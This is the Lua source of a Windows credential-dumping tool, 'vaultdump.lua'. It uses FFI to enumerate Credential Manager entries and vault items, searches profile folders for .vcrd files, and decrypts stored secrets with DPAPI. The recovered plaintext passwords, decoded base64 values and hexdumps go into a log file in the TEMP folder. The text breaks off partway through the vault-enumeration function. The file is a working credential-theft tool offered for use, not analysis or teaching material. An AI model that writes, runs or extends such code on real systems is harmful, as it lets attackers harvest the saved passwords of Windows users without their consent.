--[[
    vaultdump.lua - Windows Password Vault & DPAPI Credential Dumper
    Extracts and decrypts credentials from Windows Password Vault and DPAPI
    Uses FFI to interface with Windows SDK APIs
]]

local ffi = require("ffi")

-- Configuration
local CONFIG = {
    VERBOSE = true,
    DUMP_HEX = true,
    EXPORT_FILE = nil,  -- Set to filename to export results
    INCLUDE_SYSTEM = true,
    MAX_CREDENTIAL_SIZE = 64 * 1024,
    DEBUG_DPAPI = true,
    SEARCH_VCRD = true,
    DECODE_BASE64 = true,
    HEXDUMP_WIDTH = 16,
}

-- Global log file handle
local LOG_FILE = nil
local LOG_PATH = nil

-- Windows API Constants
local CRED_TYPE_GENERIC = 0x01
local CRED_TYPE_DOMAIN_PASSWORD = 0x02
local CRED_TYPE_DOMAIN_CERTIFICATE = 0x03
local CRED_TYPE_DOMAIN_VISIBLE_PASSWORD = 0x04
local CRED_TYPE_GENERIC_CERTIFICATE = 0x05
local CRED_TYPE_DOMAIN_EXTENDED = 0x06
local CRED_TYPE_MAXIMUM = 0x07

local CRED_PERSIST_SESSION = 0x01
local CRED_PERSIST_LOCAL_MACHINE = 0x02
local CRED_PERSIST_ENTERPRISE = 0x03

local CRYPTPROTECT_UI_FORBIDDEN = 0x01
local CRYPTPROTECT_LOCAL_MACHINE = 0x04
local CRYPTPROTECT_AUDIT = 0x10

-- Windows API Definitions
ffi.cdef[[
    typedef unsigned long DWORD;
    typedef unsigned short WORD;
    typedef unsigned char BYTE;
    typedef void* PVOID;
    typedef void* HANDLE;
    typedef const void* LPCVOID;
    typedef wchar_t WCHAR;
    typedef char CHAR;
    typedef int BOOL;
    typedef const WCHAR* LPCWSTR;
    typedef WCHAR* LPWSTR;
    typedef const CHAR* LPCSTR;
    typedef CHAR* LPSTR;
    typedef DWORD* LPDWORD;
    
    typedef struct _FILETIME {
        DWORD dwLowDateTime;
        DWORD dwHighDateTime;
    } FILETIME;
    
    typedef struct _GUID {
        DWORD Data1;
        WORD Data2;
        WORD Data3;
        BYTE Data4[8];
    } GUID;
    
    typedef struct _CREDENTIAL_ATTRIBUTEW {
        LPWSTR Keyword;
        DWORD  Flags;
        DWORD  ValueSize;
        BYTE*  Value;
    } CREDENTIAL_ATTRIBUTEW;
    
    typedef struct _CREDENTIALW {
        DWORD Flags;
        DWORD Type;
        LPWSTR TargetName;
        LPWSTR Comment;
        FILETIME LastWritten;
        DWORD CredentialBlobSize;
        BYTE* CredentialBlob;
        DWORD Persist;
        DWORD AttributeCount;
        CREDENTIAL_ATTRIBUTEW* Attributes;
        LPWSTR TargetAlias;
        LPWSTR UserName;
    } CREDENTIALW, *PCREDENTIALW;
    
    typedef struct _DATA_BLOB {
        DWORD cbData;
        BYTE* pbData;
    } DATA_BLOB;
    
    typedef struct _CRYPTPROTECT_PROMPTSTRUCT {
        DWORD cbSize;
        DWORD dwPromptFlags;
        HANDLE hwndApp;
        LPCWSTR szPrompt;
    } CRYPTPROTECT_PROMPTSTRUCT;
    
    // Credential Manager APIs
    BOOL CredEnumerateW(
        LPCWSTR Filter,
        DWORD Flags,
        DWORD* Count,
        PCREDENTIALW** Credentials
    );
    
    void CredFree(PVOID Buffer);
    
    BOOL CredReadW(
        LPCWSTR TargetName,
        DWORD Type,
        DWORD Flags,
        PCREDENTIALW* Credential
    );
    
    // DPAPI Functions
    BOOL CryptUnprotectData(
        DATA_BLOB* pDataIn,
        LPWSTR* ppszDataDescr,
        DATA_BLOB* pOptionalEntropy,
        PVOID pvReserved,
        CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct,
        DWORD dwFlags,
        DATA_BLOB* pDataOut
    );
    
    BOOL CryptProtectData(
        DATA_BLOB* pDataIn,
        LPCWSTR szDataDescr,
        DATA_BLOB* pOptionalEntropy,
        PVOID pvReserved,
        CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct,
        DWORD dwFlags,
        DATA_BLOB* pDataOut
    );
    
    // Memory management
    void* LocalFree(void* hMem);
    void* LocalAlloc(DWORD uFlags, size_t uBytes);
    
    // SID conversion
    BOOL ConvertSidToStringSidW(
        void* Sid,
        LPWSTR* StringSid
    );
    
    // String conversion
    int WideCharToMultiByte(
        unsigned int CodePage,
        DWORD dwFlags,
        LPCWSTR lpWideCharStr,
        int cchWideChar,
        LPSTR lpMultiByteStr,
        int cbMultiByte,
        LPCSTR lpDefaultChar,
        BOOL* lpUsedDefaultChar
    );
    
    int MultiByteToWideChar(
        unsigned int CodePage,
        DWORD dwFlags,
        LPCSTR lpMultiByteStr,
        int cbMultiByte,
        LPWSTR lpWideCharStr,
        int cchWideChar
    );
    
    // Vault APIs
    DWORD VaultEnumerateVaults(
        DWORD dwFlags,
        DWORD* pdwVaultsCount,
        void*** ppVaultGuids
    );
    
    DWORD VaultOpenVault(
        const void* pVaultGuid,
        DWORD dwFlags,
        void** ppVault
    );
    
    DWORD VaultCloseVault(
        void* pVault
    );
    
    DWORD VaultEnumerateItems(
        void* pVault,
        DWORD dwFlags,
        DWORD* pdwItemsCount,
        void** ppItems
    );
    
    DWORD VaultGetItem(
        void* pVault,
        const void* pSchemaId,
        void* pResource,
        void* pIdentity,
        void* pPackageSid,
        HANDLE hwndOwner,
        DWORD dwFlags,
        void** ppItem
    );
    
    DWORD VaultFree(
        void* pMemory);
    
    // Vault Item Structures
    typedef struct _VAULT_ITEM_DATA {
        DWORD dwType;
        DWORD unknown1;
        union {
            struct {
                DWORD length;
                LPWSTR string;
            } string_data;
            struct {
                DWORD length;
                BYTE* data;
            } byte_array;
            DWORD dword_data;
            BOOL bool_data;
            GUID guid_data;
            struct {
                LPWSTR string;
            } protected_string;  // For type 7
            void* sid;  // For type 8 (SID pointer)
        };
    } VAULT_ITEM_DATA;
    
    typedef struct _VAULT_ITEM_ELEMENT {
        DWORD schemaElementId;
        DWORD unknown1;
        VAULT_ITEM_DATA data;
    } VAULT_ITEM_ELEMENT;
    
    typedef struct _VAULT_ITEM_7 {
        GUID schemaId;
        LPWSTR friendlyName;
        VAULT_ITEM_ELEMENT* pResourceElement;
        VAULT_ITEM_ELEMENT* pIdentityElement;
        VAULT_ITEM_ELEMENT* pAuthenticatorElement;
        FILETIME lastWritten;
        DWORD dwFlags;
        DWORD dwPropertiesCount;
        VAULT_ITEM_ELEMENT* pProperties;
    } VAULT_ITEM_7;
    
    typedef struct _VAULT_ITEM_8 {
        GUID schemaId;
        LPWSTR friendlyName;
        VAULT_ITEM_ELEMENT* pResourceElement;
        VAULT_ITEM_ELEMENT* pIdentityElement;
        VAULT_ITEM_ELEMENT* pAuthenticatorElement;
        VAULT_ITEM_ELEMENT* pPackageSid;
        FILETIME lastWritten;
        DWORD dwFlags;
        DWORD dwPropertiesCount;
        VAULT_ITEM_ELEMENT* pProperties;
    } VAULT_ITEM_8;
    
    // Additional Windows APIs
    DWORD GetLastError();
    
    // Additional Windows APIs
    DWORD GetEnvironmentVariableA(
        LPCSTR lpName,
        LPSTR lpBuffer,
        DWORD nSize
    );
    
    DWORD GetComputerNameA(
        LPSTR lpBuffer,
        LPDWORD nSize
    );
    
    // File operations
    HANDLE CreateFileA(
        LPCSTR lpFileName,
        DWORD dwDesiredAccess,
        DWORD dwShareMode,
        void* lpSecurityAttributes,
        DWORD dwCreationDisposition,
        DWORD dwFlagsAndAttributes,
        HANDLE hTemplateFile
    );
    
    BOOL ReadFile(
        HANDLE hFile,
        void* lpBuffer,
        DWORD nNumberOfBytesToRead,
        LPDWORD lpNumberOfBytesRead,
        void* lpOverlapped
    );
    
    BOOL CloseHandle(HANDLE hObject);
    
    DWORD GetFileSize(
        HANDLE hFile,
        LPDWORD lpFileSizeHigh
    );
    
    HANDLE FindFirstFileA(
        LPCSTR lpFileName,
        void* lpFindFileData
    );
    
    BOOL FindNextFileA(
        HANDLE hFindFile,
        void* lpFindFileData
    );
    
    BOOL FindClose(HANDLE hFindFile);
    
    typedef struct _WIN32_FIND_DATAA {
        DWORD dwFileAttributes;
        FILETIME ftCreationTime;
        FILETIME ftLastAccessTime;
        FILETIME ftLastWriteTime;
        DWORD nFileSizeHigh;
        DWORD nFileSizeLow;
        DWORD dwReserved0;
        DWORD dwReserved1;
        CHAR cFileName[260];
        CHAR cAlternateFileName[14];
    } WIN32_FIND_DATAA;
]]

local advapi32 = ffi.load("Advapi32")
local crypt32 = ffi.load("Crypt32")
local kernel32 = ffi.load("Kernel32")
local vaultcli = ffi.load("vaultcli")

-- File constants
local GENERIC_READ = 0x80000000
local FILE_SHARE_READ = 0x00000001
local OPEN_EXISTING = 3
local FILE_ATTRIBUTE_NORMAL = 0x80
local INVALID_HANDLE_VALUE = ffi.cast("HANDLE", -1)

-- Logging Functions (forward declaration)
local log, debug_log

local function init_log()
    local temp = ffi.new("char[260]")
    kernel32.GetEnvironmentVariableA("TEMP", temp, 260)
    local temp_path = ffi.string(temp)
    
    local computer = ffi.new("char[260]")
    local size = ffi.new("DWORD[1]", 260)
    kernel32.GetComputerNameA(computer, size)
    local computer_name = ffi.string(computer)
    
    local timestamp = os.date("%Y%m%d_%H%M%S")
    LOG_PATH = string.format("%s\\%s_DPAPIdump_%s.log", temp_path, computer_name, timestamp)
    
    LOG_FILE = io.open(LOG_PATH, "w")
    if LOG_FILE then
        -- Write initial log entries directly to avoid circular call
        local function write_log(msg)
            LOG_FILE:write(msg .. "\n")
            LOG_FILE:flush()
            if CONFIG.VERBOSE then
                print(msg)
            end
        end
        
        write_log("[+] Log file created: " .. LOG_PATH)
        write_log(string.format("[*] Dump started at: %s", os.date("%Y-%m-%d %H:%M:%S")))
        write_log(string.format("[*] Computer: %s", computer_name))
        write_log(string.rep("=", 80))
    end
end

log = function(message)
    if LOG_FILE then
        LOG_FILE:write(message .. "\n")
        LOG_FILE:flush()
    end
    if CONFIG.VERBOSE then
        print(message)
    end
end

debug_log = function(message)
    if CONFIG.DEBUG_DPAPI then
        log("[DEBUG] " .. message)
    end
end

-- Utility Functions
local function hexdump(data, size, offset)
    offset = offset or 0
    local result = {}
    
    for i = 0, size - 1, CONFIG.HEXDUMP_WIDTH do
        local hex_part = {}
        local ascii_part = {}
        
        for j = 0, CONFIG.HEXDUMP_WIDTH - 1 do
            if i + j < size then
                local byte = data[i + j]
                table.insert(hex_part, string.format("%02X", byte))
                
                if byte >= 32 and byte <= 126 then
                    table.insert(ascii_part, string.char(byte))
                else
                    table.insert(ascii_part, ".")
                end
            else
                table.insert(hex_part, "  ")
                table.insert(ascii_part, " ")
            end
        end
        
        local line = string.format("%08X  %-47s  |%s|", 
            offset + i,
            table.concat(hex_part, " "),
            table.concat(ascii_part))
        table.insert(result, line)
    end
    
    return table.concat(result, "\n")
end

local function is_base64(str)
    if not str or #str == 0 then return false end
    -- Check if string looks like base64
    return str:match("^[A-Za-z0-9+/]+=*$") ~= nil and #str % 4 == 0 and #str > 20
end

local function decode_base64(str)
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local b64lookup = {}
    for i = 1, #b64chars do
        b64lookup[b64chars:sub(i, i)] = i - 1
    end
    b64lookup['='] = 0
    
    local result = {}
    for i = 1, #str, 4 do
        local a = b64lookup[str:sub(i, i)] or 0
        local b = b64lookup[str:sub(i+1, i+1)] or 0
        local c = b64lookup[str:sub(i+2, i+2)] or 0
        local d = b64lookup[str:sub(i+3, i+3)] or 0
        
        local n = bit.bor(bit.lshift(a, 18), bit.lshift(b, 12), bit.lshift(c, 6), d)
        
        table.insert(result, string.char(bit.rshift(n, 16)))
        if str:sub(i+2, i+2) ~= '=' then
            table.insert(result, string.char(bit.band(bit.rshift(n, 8), 0xFF)))
        end
        if str:sub(i+3, i+3) ~= '=' then
            table.insert(result, string.char(bit.band(n, 0xFF)))
        end
    end
    
    return table.concat(result)
end

local function wstring_to_string(wstr)
    if wstr == nil or wstr == ffi.NULL then
        return nil
    end
    
    local CP_UTF8 = 65001
    local len = ffi.C.WideCharToMultiByte(CP_UTF8, 0, wstr, -1, nil, 0, nil, nil)
    if len <= 0 then
        return nil
    end
    
    local buf = ffi.new("char[?]", len)
    ffi.C.WideCharToMultiByte(CP_UTF8, 0, wstr, -1, buf, len, nil, nil)
    return ffi.string(buf)
end

local function string_to_wstring(str)
    if not str then
        return nil
    end
    
    local CP_UTF8 = 65001
    local len = ffi.C.MultiByteToWideChar(CP_UTF8, 0, str, -1, nil, 0)
    if len <= 0 then
        return nil
    end
    
    local wbuf = ffi.new("WCHAR[?]", len)
    ffi.C.MultiByteToWideChar(CP_UTF8, 0, str, -1, wbuf, len)
    return wbuf
end

local function bytes_to_hex(data, size)
    local hex = {}
    for i = 0, size - 1 do
        table.insert(hex, string.format("%02X", data[i]))
    end
    return table.concat(hex, " ")
end

local function bytes_to_string(data, size)
    local result = {}
    for i = 0, size - 1 do
        local byte = data[i]
        if byte >= 32 and byte <= 126 then
            table.insert(result, string.char(byte))
        else
            table.insert(result, ".")
        end
    end
    return table.concat(result)
end

local function is_printable(data, size)
    local printable_count = 0
    local null_count = 0
    
    for i = 0, size - 1 do
        local byte = data[i]
        if byte == 0 then
            null_count = null_count + 1
        elseif byte >= 32 and byte <= 126 then
            printable_count = printable_count + 1
        end
    end
    
    -- Consider printable if >70% printable chars (excluding nulls)
    local non_null = size - null_count
    return non_null > 0 and (printable_count / non_null) > 0.7
end

local function filetime_to_string(ft)
    local low = tonumber(ft.dwLowDateTime)
    local high = tonumber(ft.dwHighDateTime)
    
    if low == 0 and high == 0 then
        return "Never"
    end
    
    -- Convert FILETIME to 64-bit value
    local time64 = high * 4294967296 + low
    
    -- FILETIME epoch is January 1, 1601
    -- Convert to Unix epoch (January 1, 1970)
    local FILETIME_1970 = 116444736000000000
    
    if time64 < FILETIME_1970 then
        return "Invalid"
    end
    
    -- Convert from 100-nanosecond intervals to seconds
    local unix_time = (time64 - FILETIME_1970) / 10000000
    
    -- Protect against invalid dates
    if unix_time < 0 or unix_time > 2147483647 then
        return "Invalid"
    end
    
    return os.date("%Y-%m-%d %H:%M:%S", unix_time)
end

local function get_cred_type_string(type)
    local types = {
        [CRED_TYPE_GENERIC] = "Generic",
        [CRED_TYPE_DOMAIN_PASSWORD] = "Domain Password",
        [CRED_TYPE_DOMAIN_CERTIFICATE] = "Domain Certificate",
        [CRED_TYPE_DOMAIN_VISIBLE_PASSWORD] = "Domain Visible Password",
        [CRED_TYPE_GENERIC_CERTIFICATE] = "Generic Certificate",
        [CRED_TYPE_DOMAIN_EXTENDED] = "Domain Extended",
    }
    return types[type] or string.format("Unknown (0x%X)", type)
end

local function get_persist_string(persist)
    local types = {
        [CRED_PERSIST_SESSION] = "Session",
        [CRED_PERSIST_LOCAL_MACHINE] = "Local Machine",
        [CRED_PERSIST_ENTERPRISE] = "Enterprise",
    }
    return types[persist] or string.format("Unknown (0x%X)", persist)
end

-- DPAPI Decryption
local function dpapi_decrypt(encrypted_data, data_size, description)
    description = description or "unknown"
    debug_log(string.format("Attempting DPAPI decryption on %d bytes (%s)", data_size, description))
    
    -- Convert Lua string to FFI buffer if needed
    local data_ptr
    if type(encrypted_data) == "string" then
        -- It's a Lua string, copy to FFI buffer
        local buffer = ffi.new("BYTE[?]", data_size)
        ffi.copy(buffer, encrypted_data, data_size)
        data_ptr = buffer
    else
        -- Assume it's already an FFI pointer
        data_ptr = encrypted_data
    end
    
    local attempts = {
        {name = "UI_FORBIDDEN", flags = CRYPTPROTECT_UI_FORBIDDEN},
        {name = "UI_FORBIDDEN + LOCAL_MACHINE", flags = bit.bor(CRYPTPROTECT_UI_FORBIDDEN, CRYPTPROTECT_LOCAL_MACHINE)},
        {name = "UI_FORBIDDEN + AUDIT", flags = bit.bor(CRYPTPROTECT_UI_FORBIDDEN, CRYPTPROTECT_AUDIT)},
        {name = "No flags", flags = 0},
    }
    
    for _, attempt in ipairs(attempts) do
        debug_log(string.format("DPAPI attempt with flags: %s (0x%X)", attempt.name, attempt.flags))
        
        local data_in = ffi.new("DATA_BLOB")
        data_in.cbData = data_size
        data_in.pbData = data_ptr
        
        local data_out = ffi.new("DATA_BLOB")
        local descr = ffi.new("LPWSTR[1]")
        
        local ok, result = pcall(function()
            return crypt32.CryptUnprotectData(
                data_in,
                descr,
                nil,
                nil,
                nil,
                attempt.flags,
                data_out
            )
        end)
        
        if not ok then
            debug_log(string.format("DPAPI call crashed: %s", tostring(result)))
        elseif result ~= 0 then
            debug_log(string.format("DPAPI decryption SUCCESS with %s", attempt.name))
            
            local decrypted = ffi.string(data_out.pbData, data_out.cbData)
            local descr_str = nil
            
            if descr[0] ~= nil and descr[0] ~= ffi.NULL then
                descr_str = wstring_to_string(descr[0])
                debug_log(string.format("DPAPI description: %s", descr_str or "N/A"))
            end
            
            if data_out.pbData ~= nil then
                ffi.C.LocalFree(data_out.pbData)
            end
            
            if descr[0] ~= nil then
                ffi.C.LocalFree(descr[0])
            end
            
            return decrypted, descr_str
        else
            local err = kernel32.GetLastError()
            debug_log(string.format("DPAPI decryption FAILED with error: 0x%X", err))
        end
    end
    
    debug_log("All DPAPI decryption attempts failed")
    return nil, nil
end

-- Search and decrypt .vcrd files
local function find_vcrd_files()
    local vcrd_files = {}
    local search_paths = {
        os.getenv("LOCALAPPDATA") .. "\\Microsoft\\Vault",
        os.getenv("APPDATA") .. "\\Microsoft\\Vault",
        os.getenv("LOCALAPPDATA") .. "\\Microsoft\\Credentials",
        os.getenv("APPDATA") .. "\\Microsoft\\Credentials",
        os.getenv("SYSTEMROOT") .. "\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault",
    }
    
    log("\n[*] Searching for .vcrd credential files...")
    
    for _, base_path in ipairs(search_paths) do
        if base_path:find("nil") then
            goto continue
        end
        
        debug_log("Searching in: " .. base_path)
        
        -- Search recursively
        local patterns = {
            base_path .. "\\*.vcrd",
            base_path .. "\\*\\*.vcrd",
            base_path .. "\\*\\*\\*.vcrd",
        }
        
        for _, pattern in ipairs(patterns) do
            local find_data = ffi.new("WIN32_FIND_DATAA")
            local handle = kernel32.FindFirstFileA(pattern, find_data)
            
            if handle ~= INVALID_HANDLE_VALUE then
                repeat
                    local filename = ffi.string(find_data.cFileName)
                    if filename ~= "." and filename ~= ".." then
                        local full_path = pattern:gsub("%*%.vcrd$", filename)
                        table.insert(vcrd_files, full_path)
                        log(string.format("[+] Found .vcrd file: %s", full_path))
                    end
                until kernel32.FindNextFileA(handle, find_data) == 0
                
                kernel32.FindClose(handle)
            end
        end
        
        ::continue::
    end
    
    return vcrd_files
end

local function decrypt_vcrd_file(filepath)
    debug_log("Reading .vcrd file: " .. filepath)
    
    local file_handle = kernel32.CreateFileA(
        filepath,
        GENERIC_READ,
        FILE_SHARE_READ,
        nil,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nil
    )
    
    if file_handle == INVALID_HANDLE_VALUE then
        local err = kernel32.GetLastError()
        debug_log(string.format("Failed to open file: 0x%X", err))
        return nil
    end
    
    local file_size = kernel32.GetFileSize(file_handle, nil)
    if file_size == 0 or file_size == 0xFFFFFFFF then
        kernel32.CloseHandle(file_handle)
        debug_log("Invalid file size")
        return nil
    end
    
    debug_log(string.format("File size: %d bytes", file_size))
    
    local buffer = ffi.new("uint8_t[?]", file_size)
    local bytes_read = ffi.new("DWORD[1]")
    
    local result = kernel32.ReadFile(file_handle, buffer, file_size, bytes_read, nil)
    kernel32.CloseHandle(file_handle)
    
    if result == 0 then
        debug_log("Failed to read file")
        return nil
    end
    
    log(string.format("[*] Read %d bytes from %s", bytes_read[0], filepath))
    
    -- Try to decrypt the entire file content with DPAPI
    local decrypted, descr = dpapi_decrypt(buffer, bytes_read[0], filepath)
    
    if decrypted then
        log(string.format("[+] Successfully decrypted .vcrd file: %s", filepath))
        if descr then
            log(string.format("    Description: %s", descr))
        end
        return {
            filepath = filepath,
            size = bytes_read[0],
            decrypted = decrypted,
            description = descr,
            raw_hex = bytes_to_hex(buffer, math.min(256, bytes_read[0]))
        }
    else
        log(string.format("[!] Failed to decrypt .vcrd file: %s", filepath))
        return {
            filepath = filepath,
            size = bytes_read[0],
            decrypted = nil,
            raw_hex = bytes_to_hex(buffer, math.min(256, bytes_read[0]))
        }
    end
end

-- Credential Manager Enumeration
local function enumerate_credentials()
    local credentials = {}
    local count = ffi.new("DWORD[1]")
    local creds = ffi.new("PCREDENTIALW*[1]")
    
    if CONFIG.VERBOSE then
        print("\n[*] Enumerating Windows Credential Manager...")
    end
    
    local result = advapi32.CredEnumerateW(nil, 0, count, creds)
    
    if result == 0 then
        local err = kernel32.GetLastError()
        if CONFIG.VERBOSE then
            print(string.format("[!] CredEnumerateW failed with error: 0x%X", err))
        end
        return credentials
    end
    
    if CONFIG.VERBOSE then
        print(string.format("[+] Found %d credentials", count[0]))
    end
    
    for i = 0, count[0] - 1 do
        local cred = creds[0][i]
        local cred_info = {}
        
        cred_info.target = wstring_to_string(cred.TargetName)
        cred_info.username = wstring_to_string(cred.UserName)
        cred_info.comment = wstring_to_string(cred.Comment)
        cred_info.type = get_cred_type_string(cred.Type)
        cred_info.type_id = cred.Type
        cred_info.persist = get_persist_string(cred.Persist)
        cred_info.last_written = filetime_to_string(cred.LastWritten)
        
        if cred.CredentialBlobSize > 0 and cred.CredentialBlob ~= nil then
            local blob_size = cred.CredentialBlobSize
            
            -- Try to decrypt with DPAPI
            local decrypted, descr = dpapi_decrypt(cred.CredentialBlob, blob_size, cred_info.target or "credential")
            
            if decrypted then
                cred_info.password = decrypted
                cred_info.decrypted = true
                cred_info.dpapi_description = descr
                
                -- Check if decrypted data is base64
                if CONFIG.DECODE_BASE64 and is_base64(decrypted) then
                    local decoded = decode_base64(decrypted)
                    if is_printable(ffi.cast("uint8_t*", decoded), #decoded) then
                        cred_info.password_base64_decoded = decoded
                    end
                end
            else
                -- Try to read as plain text
                local plain = ffi.string(cred.CredentialBlob, blob_size)
                
                if is_printable(cred.CredentialBlob, blob_size) then
                    cred_info.password = plain:gsub("%z", "")
                    cred_info.decrypted = false
                    
                    -- Check if plaintext is base64
                    if CONFIG.DECODE_BASE64 and is_base64(cred_info.password) then
                        local decoded = decode_base64(cred_info.password)
                        if is_printable(ffi.cast("uint8_t*", decoded), #decoded) then
                            cred_info.password_base64_decoded = decoded
                        end
                    end
                else
                    -- Binary data - store as hexdump
                    cred_info.password_hexdump = hexdump(cred.CredentialBlob, blob_size)
                    cred_info.decrypted = false
                end
            end
            
            cred_info.blob_size = blob_size
        end
        
        -- Process attributes
        if cred.AttributeCount > 0 and cred.Attributes ~= nil then
            cred_info.attributes = {}
            for j = 0, cred.AttributeCount - 1 do
                local attr = cred.Attributes[j]
                local attr_info = {
                    keyword = wstring_to_string(attr.Keyword),
                    value_size = attr.ValueSize,
                }
                
                if attr.ValueSize > 0 and attr.Value ~= nil then
                    -- Try to decrypt attribute value with DPAPI
                    local decrypted_attr, attr_descr = dpapi_decrypt(attr.Value, attr.ValueSize, attr_info.keyword or "attribute")
                    
                    if decrypted_attr then
                        attr_info.value = decrypted_attr
                        attr_info.decrypted = true
                        attr_info.dpapi_description = attr_descr
                    else
                        -- Check if printable
                        if is_printable(attr.Value, attr.ValueSize) then
                            attr_info.value = ffi.string(attr.Value, attr.ValueSize)
                            attr_info.decrypted = false
                        else
                            -- Store as hexdump for binary data
                            attr_info.value_hexdump = hexdump(attr.Value, attr.ValueSize)
                            attr_info.decrypted = false
                        end
                    end
                end
                
                table.insert(cred_info.attributes, attr_info)
            end
        end
        
        table.insert(credentials, cred_info)
    end
    
    advapi32.CredFree(creds[0])
    
    return credentials
end

-- Helper function to extract vault item data
local function get_vault_item_value(item_data)
    if item_data == nil then
        return nil
    end
    
    local dtype = tonumber(item_data.dwType)
    
    -- Type 0: Boolean
    if dtype == 0 then
        return tostring(item_data.bool_data ~= 0)
    
    -- Type 1: Short (2 bytes)
    elseif dtype == 1 then
        return tostring(item_data.dword_data)
    
    -- Type 2: DWORD (4 bytes)
    elseif dtype == 2 then
        return tostring(item_data.dword_data)
    
    -- Type 3: QWORD (8 bytes)
    elseif dtype == 3 then
        return tostring(item_data.dword_data)
    
    -- Type 4: String (Unicode)
    elseif dtype == 4 then
        if item_data.string_data.string ~= nil and item_data.string_data.string ~= ffi.NULL then
            return wstring_to_string(item_data.string_data.string)
        end
    
    -- Type 5: Byte Array
    elseif dtype == 5 then
        if item_data.byte_array.data ~= nil and item_data.byte_array.data ~= ffi.NULL then
            local size = tonumber(item_data.byte_array.length)
            if size > 0 then
                return {
                    type = "byte_array",
                    size = size,
                    data = item_data.byte_array.data,
                    hex = bytes_to_hex(item_data.byte_array.data, math.min(size, 256))
                }
            end
        end
    
    -- Type 6: Time Stamp
    elseif dtype == 6 then
        return "TimeStamp"
    
    -- Type 7: Protected String (encrypted/decrypted by vault)
    elseif dtype == 7 then
        -- For type 7, try the protected_string member first (direct pointer, no length prefix)
        if item_data.protected_string.string ~= nil and item_data.protected_string.string ~= ffi.NULL then
            local str_val = wstring_to_string(item_data.protected_string.string)
            if str_val and #str_val > 0 then
                debug_log(string.format("Type 7 extracted as protected_string: %s", str_val))
                return str_val
            end
        end
        
        -- Fallback: try string_data structure
        local str_ptr = item_data.string_data.string
        local str_len = tonumber(item_data.string_data.length)
        
        debug_log(string.format("Type 7 - str_ptr: %s, str_len: %d",
            tostring(str_ptr), str_len or 0))
        
        if str_ptr ~= nil and str_ptr ~= ffi.NULL and str_len and str_len > 0 and str_len < 10000 then
            local str_val = wstring_to_string(str_ptr)
            if str_val and #str_val > 0 then
                debug_log(string.format("Type 7 extracted as string_data: %s", str_val))
                return str_val
            end
        end
        
        debug_log("Type 7 returned nil - no valid data found")
    
    -- Type 8: SID (Security Identifier) - treat as string
    elseif dtype == 8 then
        debug_log("Type 8 detected (SID), attempting to extract...")
        debug_log(string.format("Type 8 - sid ptr: %s", tostring(item_data.sid)))
        
        -- Type 8 is a SID pointer - convert it to a string
        if item_data.sid ~= nil and item_data.sid ~= ffi.NULL then
            local sid_string_ptr = ffi.new("LPWSTR[1]")
            if advapi32.ConvertSidToStringSidW(item_data.sid, sid_string_ptr) ~= 0 then
                if sid_string_ptr[0] ~= nil and sid_string_ptr[0] ~= ffi.NULL then
                    local sid_str = wstring_to_string(sid_string_ptr[0])
                    kernel32.LocalFree(sid_string_ptr[0])
                    if sid_str and #sid_str > 0 then
                        debug_log(string.format("Type 8 extracted as SID: %s", sid_str))
                        return sid_str
                    end
                end
            else
                debug_log(string.format("ConvertSidToStringSidW failed: 0x%X", kernel32.GetLastError()))
            end
        end
        debug_log("Type 8 returned nil")
    
    -- Type 9, 10, 11: Various other types - try generic extraction
    elseif dtype == 9 or dtype == 10 or dtype == 11 then
        debug_log(string.format("Type %d detected, attempting generic extraction...", dtype))
        -- Try string first
        if item_data.string_data.string ~= nil and item_data.string_data.string ~= ffi.NULL then
            local str_val = wstring_to_string(item_data.string_data.string)
            if str_val and #str_val > 0 then
                return str_val
            end
        end
        -- Try byte array
        if item_data.byte_array.data ~= nil and item_data.byte_array.data ~= ffi.NULL then
            local size = tonumber(item_data.byte_array.length)
            if size > 0 and size < 10000 then
                return {
                    type = "byte_array",
                    size = size,
                    data = item_data.byte_array.data,
                    hex = bytes_to_hex(item_data.byte_array.data, math.min(size, 256))
                }
            end
        end
    
    -- Type 12: GUID
    elseif dtype == 12 then
        local guid = item_data.guid_data
        return string.format("{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
            tonumber(guid.Data1), tonumber(guid.Data2), tonumber(guid.Data3),
            tonumber(guid.Data4[0]), tonumber(guid.Data4[1]),
            tonumber(guid.Data4[2]), tonumber(guid.Data4[3]),
            tonumber(guid.Data4[4]), tonumber(guid.Data4[5]),
            tonumber(guid.Data4[6]), tonumber(guid.Data4[7]))
    end
    
    return nil
end

-- Known Vault Type GUIDs
local KNOWN_VAULT_GUIDS = {
    ["{2F1A6504-0641-44CF-8BB5-3612D865F2E5}"] = "Windows Secure Note",
    ["{3CCD5499-87A8-4B10-A215-608888DD3B55}"] = "Windows Web Password Credential",
    ["{154E23D0-C644-4E6F-8CE6-5069272F999F}"] = "Windows Credential Picker Protector",
    ["{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}"] = "Web Credentials",
    ["{77BC582B-F0A6-4E15-4E80-61736B6F3B29}"] = "Windows Credentials"
}

local function get_vault_name(guid_str)
    return KNOWN_VAULT_GUIDS[guid_str:upper()] or "Unknown Vault Type"
end

-- Password Vault Enumeration with Item Extraction

local function enumerate_vaults()
    local vaults_data = {}
    local vault_count = ffi.new("DWORD[1]")
    local vault_guids = ffi.new("void**[1]")
    
    if CONFIG.VERBOSE then
        print("\n[*] Enumerating Windows Password Vaults...")
    end
    
    local status, result = pcall(function()
        return vaultcli.VaultEnumerateVaults(0, vault_count, vault_guids)
    end)
    
    if not status or result ~= 0 then
        if CONFIG.VERBOSE then
            if status then
                print(string.format("[!] VaultEnumerateVaults failed with error: 0x%X", result))
            else
                print("[!] VaultEnumerateVaults not available or access denied")
            end
        end
        return vaults_data
    end
    
    if CONFIG.VERBOSE then
        print(string.format("[+] Found %d vaults", vault_count[0]))
    end
    
    if vault_count[0] == 0 or vault_guids[0] == nil then
        return vaults_data
    end
    
    -- Safely access vault GUIDs with error handling
    for i = 0, vault_count[0] - 1 do
        local success, err = pcall(function()
            local guids_ptr = ffi.cast("GUID*", vault_guids[0])
            local vault_guid = guids_ptr + i
            local vault_handle = ffi.new("void*[1]")
            
            local guid_str = string.format(
                "{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
                tonumber(vault_guid.Data1), tonumber(vault_guid.Data2), tonumber(vault_guid.Data3),
                tonumber(vault_guid.Data4[0]), tonumber(vault_guid.Data4[1]),
